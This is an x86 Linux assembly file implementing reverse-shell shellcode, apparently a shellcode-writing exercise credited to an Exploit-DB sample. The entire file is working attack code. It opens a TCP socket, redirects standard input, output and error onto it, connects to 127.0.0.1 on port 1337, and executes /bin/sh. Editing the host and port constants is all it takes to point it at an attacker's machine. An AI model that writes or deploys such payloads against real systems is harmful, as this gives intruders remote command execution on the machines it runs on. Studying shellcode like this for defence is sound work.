global _start

PORT equ 0x3905	; 1337
HOST equ 0x0100007f ; 127.0.0.1

; Based on shellcode from: https://www.exploit-db.com/exploits/36397/

section .text
_start:
    ; socket(AF_INET, SOCK_STREAM, 0);
    push 0x66           ; socketcall()
    pop eax
    cdq                 ; zero out edx
    push edx            ; protocol
    inc edx
    push edx            ; SOCK_STREAM
    mov ebx, edx        ; socket()
    inc edx
    push edx            ; AF_INET
    mov ecx, esp        ; load address of the parameter array
    int 0x80            ; call socketcall()

    ; dup2()
    xchg ebx, eax       ; store sockfd in ebx
    mov ecx, edx        ; initialize counter to 2
    loop:
        mov al, 0x3f
        int 0x80
        dec ecx
        jns loop

    ; connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    mov al, 0x66        ; socketcall()
    xchg ebx, edx       ; ebx=2, edx=sockfd
    push HOST
    push WORD PORT
    push WORD bx        ; AF_INET
    inc ebx             ; connect() -> 3
    mov ecx, esp        ; point to the structure
    push 0x10           ; sizeof(struct sockaddr_in)
    push ecx            ; &serv_addr
    push edx            ; sockfd
    mov ecx, esp        ; load address of the parameter array
    int 0x80            ; call socketcall()

    ; execve("/bin/sh", NULL , NULL);
    push 0xb            ; execve()
    pop eax
    cdq                 ; zero out edx
    mov ecx, edx        ; zero out ecx
    push edx            ; push null bytes (terminate string)
    push 0x68732f2f     ; //sh
    push 0x6e69622f     ; /bin
    mov ebx, esp        ; load address of /bin/sh
    int 0x80            ; call execve()
